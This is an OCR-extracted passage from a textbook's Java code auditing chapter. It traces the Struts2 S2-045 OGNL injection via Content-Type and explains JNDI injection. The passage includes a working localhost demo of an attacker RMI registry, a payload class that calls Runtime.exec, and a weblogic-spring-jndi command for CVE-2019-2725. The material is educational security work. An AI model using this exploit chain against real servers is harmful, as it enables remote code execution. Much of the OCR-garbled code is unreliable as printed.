JakartaMultiPartRequestSprocessUpload: 91
# request parsing
JakartaMultiPartRequestSparseRequest :147
# Create a request
message parser to parse the upload request
JakartaMultiPartRequestScreateRequestContext
the Message Parser
#initialize
FileUploadBaseSparseRequest :334
form-data compliant stream data.
# Process multipart/
FileUploadBaseSFileItemIteratorImp1:945 # Throva ContentType
error exception
# Add the ContentType to the error message.
JakartaNultiPartRequestSparse :68
# Handling file up1oad
exceptions
AbstractMultiPartRequestSbui1dErrorMessage:102# Build Error
Kessages
LocalizedMessageSLocalizedMessage :35
# Construct function
FileUploadInterceptor$intercept :264
assignment
# Enter the file upload
process, and handle the file upload error message.
Local1zedTextUti1SfindText :391
# Find localized text nessages
Local1zedTextUti1$findText :573
# Get the default message
LocalizedTextUti1SgetDefaultMessage : 729
The folloving is the extraction and execution of an ognl expression.
TextParseUti15translateVariables:44
TextParseUti1StranslateVariables:122
TextParseUtil$translateVariables:166
TextParser$evaluate :11
OgnlTextParser$evaluate :10
---
## Page 723
10.2 Java Code Auditing
711
1. trigger point analysis
The S2-045 vulnerability is if a unexcepted value is get when Struct2 processing the
Content-Type, it will raise an exception, during the handling of the exception raised,
an RCE vulnerability may be triggered.
The description of the vulnerability tells us that Struts2 can cause an RCE when
using the Jakarta Multipart parser to handle file uploads. And the Jakarta Multipart
parser is one of the default components in Struts2 located in org.apache.struts2.
dispatcher.multipart.JakartaMultiPartRequest.
Track down to the statement to call the validation function, which is located in
Struts2’s FileUploadlnterceptor, whose function is to handle file uploads.
[zoddexyasambagaxeatatnw) = xoddexmtatmm xaddexxasambagaxedtatmn
if (multiHrapper.hasErrors ()(
request;
for (LocalizedHessage error
 : maltiwrapper getErrors (11 {
if (validation 1 =nu11) {
validation. addActionError (LocalizedTextUti1 .findText (error,
getClazz ()) , \\ DID,
error getTextKey() , ActionContext getContext () getLocale
(),\\ DIDN'T.
error , getDefaultMessage (1 , error getArgs ())) ;
Follow up is LocalizedTextUtil.findText.
public static String findText (Class aClass, String aTextName, Locale
locale,
ValueStack valueStack = ActionContext getContext () getValueStack
String defaultMessage, Object [] args) {
();
valueStack) ;
return findrext (aClass, aTextName, locale, defaultHessage, args,
According to Sect. 10.2.7.4, this takes the value stack as an argument to the
findText( ) method. The code for this method is very long, so we will only show you
the key parts.
GetDefaultMessageReturnArg result;
if (indexedTextNane == nul1) {
defaultMessage) :
result = getDefaultMessage (aTextName, locale, valueStack, args,
else {
result = getDefaultMessage (aTextName, locale, valueStack, args,
nul1) ;
---
## Page 724
712
10  Code Auditing
if (result ! = nul1 s& result.message ! = null) {
return result.message;
result = getDefaultMessage (indexedTextNane, 1locale, valueStack,
args, defaultMessagel ;
Here the getDefaultMessage( ) method is called. Within that method, you can find
a method to format the message named buildMessageFormat( ). And The message is
generated by TextParseUtil.translateVariable.
）(nu = 1 o6esssu) T
MessageFozmat mf = buildMessageFormat (TextParseUti1.
translateVariables(message, (1\)) 
String msg = formatwithNu11Detection (mf , args) ;
valueStack) , locale) ;
result = new GetDefaultMessageReturnArg (msg, found) :
Track down to the implementation of TextParseUtil.translateVariables, you can
find that it treats message as an expression, which is parsed and executed.
public static String translateVariables (String expression, ValueStack
stack)(
return translateVariables (nev char [] {'S', '$'}, expression, stack,
String class, nu1l) .toString (1 ;
public static Object translateVariables (char [] openChars, String
express1on,
final ValueStack stack, final Class asType, final ParsedValueEvaluator
int maxLoopCount) (
evaluator,
ParsedValueEvaluator ognlEval = new ParsedValueEvaluator [1 {
public Object evaluate (String parsedValue) {
Object o = stack .findValue (parsedValue, asType) ;
if (evaluator ! = null && o ! = null) {
o = evaluator evaluate (o.toString (1 >} ;
return o;
]：
TextParser parser = ( (Containex) atack,getContext () get
(Act1onContext . CONTAINER) ) - \\
getInstance (TextParser. class) ;
maxLoopCount) :
return parser .evaluate (openChars, expression, ognlEval,
Tracing upward, it tums out that message is generated by defaultMessage, so the
expression is related to defaultMessage.
---
## Page 725
10.2 Java Code Auditing
713
2. Controlled point analysis
Based on the trigger analysis, if you can control the defaultMessage, you can
customize the expression to trigger an RCE vulnerability. See the following code.
if (multiHrapper.hasErrors ()(
for (LocalizedHessage error : multiWrapper -getErrors [11 {
if (validation ! = nu11) {
validation, addActionError (LocalizedTextUti1 .findText (error.
getClazz()), \\ DID.
error.getTextKey() , ActionContext getContext () ·getLocale () , \\
error getDefaultMessage () , error getArgs ())) :
DIDN'T.
We know that defaultMessage is generated by error.getTextKeyO, so it is related
to the exception raised.
Keep tracing upwards, we found the message has something to do with Struts2’s
logic for handling file upload requests.
The default component used by Struts2 to handle requests for file uploads is org.
pednusqedsipsnnsuoede
JakartaMultiPartRequest, whose exception handler is defined as follows.
} x1
setLocale (request) :
processUpload (request, saveDir):
catch (Fi1eUpload&xception e) 
LCG.warn ("Request exceeded size limit!", e) :
LocalizedMessage errorMessage;
FileUploadBase SizeLimitExceededException ex = (FileUplcadBase,
if (e instanceof FileUploadBase.SizeLimitExceeded&xception)(
errorMessage = bui1ldErrorMessage [e, new Object [1 {ex, getPermittedSize
SizeLimitExceededException) e;
(), ex getActualsize (>}) ;
You can see that the error message is generated by buildErrorMessage. Its
implementation is as following.
protected LocalizedNessage build&rrorMessage (Throwable e, Object
}(s6xe []
String errorKey = *struts.messages-upload,error, * + e,getClass () .
LOG debug ("Prepazring error message for key: [{)1 *, errorKey) :
getSimpleName () :
return nev LocalizedMessage (this getClass [l , errorKey, e.
 (s6xe * () aBessowo5
---
## Page 726
714
10 Code Auditing
By calling e.getMessage() to get the message contained in the exception. THen
the message is assigned to the defaultMessage of LocalizedMessage. The
defaultMessage is the message that triggers the vulnerability later, that is, the
Kquo nof os ( jasessa8'a q8non sungua Sursed a ou! passed s uossaudxa
need to find out whether the message in the exception class is controllable.
When tracing down to the processUpload method, you can see the following
code.
public FileItemIterator getItemIterator (RequestContext ctx) throws
FileUploadException, I0Exception β
1. &x2
return new FileItemIteratorImpl (ctx) :
catch (FileUploadI0Exception e) {
paqeTnsdeoua dexnun / /
SizeException
throv (FileUploadException) e getCause () :
Finally, the Fileltemlteratorlmpl file.
If {(nul1 = contentType) II (:eontentType toLowerCase (Locale.
String contentType = ctx. getContentType () ;
ENGLISH) . starsNith (MULTIPART) 1{
throw nev InvalidContentTypeException [
fornat (*the request doesn’t contain a ls or $s strean, content type
\ “a$ sT xoptau
HULTIPART_FORM_DATA, MULTIPART_MIXED, contentType) ) ;
From the above code, if the contentType is empty or does not begin with
multipart, an error is thrown and the contentType is added to the error message,
and this is where we can control. If a request is constructed with a contentType that is
an OGNL expression, it can cause OGNL expression injection.
10.2.7.5 Expression Injection Summary
The three most important characteristics when analyzing or mining expression
injection are that the expression is controllable, that it bypasses the filtering mech-
anisms present in the context, and that it looks for the point at which the expression is
executed. They are linked together in a complete chain of exploitation.
10.2.8VulnerabilityExploits oftheJavaWeb
The exploit methods of Java Web are different from other common exploit methods.
The common exploit methods include: triggering vulnerability via HTTP request
---
## Page 727
10.2 Java Code Auditing
715
(including expression injection), remote class loading exploit (the common exploit
method is JNDI). This section focuses on the Weblogic wls9-async component RCE
(CVE-2019-2725), which exposed in April 2019, as an example.
10.2.8.1JNDI Injection
1. JNDI Injection Overview
JNDI (Java Naming and Directory Interface) is a standard Java foundamental
Interface provided by Sun Microsystems. The client side uses this interface to search
for and discover data or objects by name, so it is also a kind of key-value model.
Naming Service and Directory Service are the keys to JNDI.
A naming service is an entity that binds a name to a value, which itself provides a
tool named lookup for finding objects based on their name
Directory service is a special naming services that can store or be used to query
“directory objects". Directory objects can be associated with object properties, thus
directory services provide the ability to extend the manipulation of object properties.
To store Java objects in naming services and directory services, we can use a
serialized string of bytecodes to represent for that object. Not all objects can be
bound to the bytecode because the serialized bytecode may be too large or too long.
The JNDI Naming Reference can specify a remote object factory to create Java
objects, which solves the problem of bytecodes that are too long to bind.
There are two important parameters in the JNDI Reference.
• Reference Addresses: remote reference addresses, such as mi://server/ref.
• Remote Factory: A remote factory class used to initialize an object, including the
factory class’ name and Codebase (the path to the factory class file).
The reference object can create a Java object with specific factory. A user can specify
the remote object factory address, and if the remote object address is controllable by
the user, a security issue may arise, see Fig. 10.53.
First, the attacker binds the payload to a directory server (RMI server) that the
attacker controls. Then, the attacker passes the address of the directory server he
controls into the JNDI lookup( ) method of the vulnerable server. The vulnerable
server executes the lookup( ) method and connects to the aftacker-controlled direc-
tory server (RMI server) and returms the payload that attacker has bound.
The key to JNDI injection is dynamic protocol switching. The lookup( ) method
allows to use any protocol and provider in the case of an absolute path is given as an
argument. So, when the argument in lookup( ) is controllable, it is possible to cause
JNDI injection, when the context object is required to be a object initialized by
InitialContext or its subclasses (InitialDirContext, InitialLdapContext).
Therefore, JNDI injection requires two main conditions.
▪ The context object is initialized by InitialContext or its subclasses. Its lookupO
method allows dynamic protocol switching.
▪The lookupO parameter is controllable.
---
## Page 728
716
10 Code Auditing
Attack Process
1. Attacker binds Payload in alftacker
Naming/Directory service.
3.Application performs the lockup
vulnerable JNDI lookup method.
4. Application connects to attacker
controlled ND Service that retuns
5. Appication decodes the response and
Payload.
triggers the Payload.
Fig, 10.53 From BlackHat'’s PowerPoint (2016)
2. hands-on implementation of the JNDI
The following shows a JNDI demo that I have implemented to enhance the under-
standing of JNDI.
(1) Establishing a Vulnerable Service
There are two key points based on the requirement needed by the attack: a context is
established, and the address in the lookupO method is controllable. For example:
import javax.naming;
import javax.initial.InitialContext ;
public class VulnerableServer 
public static void main (String [] args) throws Exception (
String uri = *rmd : //127.0. 0 .1:2000/Exp1oita ;
Context ctx = new InitialContext (1 :
ctx. 1ookup (ur1) ;
For testing purposes, you can manually change the address of the URI to lookup.
(2) Establishing attacker-controlled directory service
A directory service that an aftacker can control needs to bind its own payload’s
address to the directory service while ensuring that the directory service has access to
the payload’s address.
import com.sun -jndi .rmi .regiatry .Referencelrapper;
import javax.nursing.Reference;
import java.rmi .registry LocateRegistzy:
import java. rmi .registry Registzry:
---
## Page 729
10.2 Java Code Auditing
717
public class AttackServer {
public static void main (String [] args) throws Exception 
Registry registzy = LocateRegistzy. createRegistry (2000) : 
Reference reference = new Reference [*Exploit", *Exploit*, "http: //
127.0 .0.1: 9999/*) ;
ReferenceHrapper referenceNrapper = nev ReferenceWrapper
registry .bind (*Exploit", referenceHrapper) :
(reference) ;
上
This places payload on port 9999 of the attacker’s server, while the directory
directory service).
service listens on port 2000, and binds payload to the Exploit class (located on the
(3) Demo Effects
First, you need to prepare the payload.
public class Exploit (
public Exploit (1 
try 
: ,dde xogetnoteo/suotse>ttddy/ uado, = puo fut.xag
final Process process = Runtime getRuntime () -exec (cmd) ;
printMessage (process - get Input.Strean (1) :
printMessage (process -getErrorStrean (1) :
int value = process.vaitFor [1 
System.out println (value) ;
catch (Exception e) 
e . printStackTrace () :
public static void printMessage (final InputStrean input) {
nev Thread (new Runnable [1 {
public void run () (
gOverride
Reader reader = new InputStreamReader [input) :
BufferedReader bf = new BufferedReader (reader) :
String line = null;
txy 
while ((line=bf .readLine (11 ! =nul1) {
System.out println (1ine) :
catch (IoException e) {
e . printStackTrace () :
}) .start () ;
---
## Page 730
718
10 Code Auditing
total32
stff
L.1K Apr
1tucifer
1 lucifaer
staff
1.1K Apr
418:84 Exploit$1.class
1.2K Apr
418:84Expleit.class
3lucifaer
staff
968 Apr 4 18:84 deo
1288 Apr
418:04 co
press Ctrl-C to qult.
Fig, 10.54 Launch the HTTP service
Fig, 10.55 Launch a calculator
Deploy the payload to the attacker’s own server and make sure it is accessible,
here using the “php S" command to launch the HTTP service, see Fig. 10.54.
Connecting to directory services and vulnerable services under the attacker's control
will execute the payload, and execute the payload attacker has set, which in this case
is to launch a calculator, see Fig. 10.55.
(5) Demo in a real environment
In a real scenario, many vulnerabilities are exploited by way of JDNI, and the following is
an example of how this can be applied in practice, using the Weblogic RCE (CVE-2019.
2725), which was released in 2019, as an example. If you are interested in the vulnera-
bilities, we recommend you to read this article by scanning the QR code below.
---
## Page 731
10.2 Java Code Auditing
719
Inport con.sun. Jndl.rml.registry-Referencefrapper;
ekegistry:
pubtic classAttackServer
puolic st
Regist
eRegistry( prt 2eee);
nce = nev Reference( classNeme
e:“Exploit",factory: “Exptoit”
irapper(reference);
长"Exploit",referenct
eMrapper);
Fig, 10.56 Test code
In addition to using a deserialization exploit chain, this vulnerability can also use
the exploit chain of the CVE-2018-3191 vulnerability to pass a directory service
address, which can cause JDNI injection and execute arbitrary command.
After setting up the attacker’s directory server (same as the demo above), open the
directory server listening port, see Fig. 10.56.
Generate serialized data using EXP with the following command.
java -jar weblogic-spzing-jndi-10.3 6,0 .jar rmi : //127,0.0.1:2000/
Exploit > poc2
After converting the serialized data into the ByteArray required for the vulnera-
load, and the JDNI injection wil be triggered, and pop up a calculator, see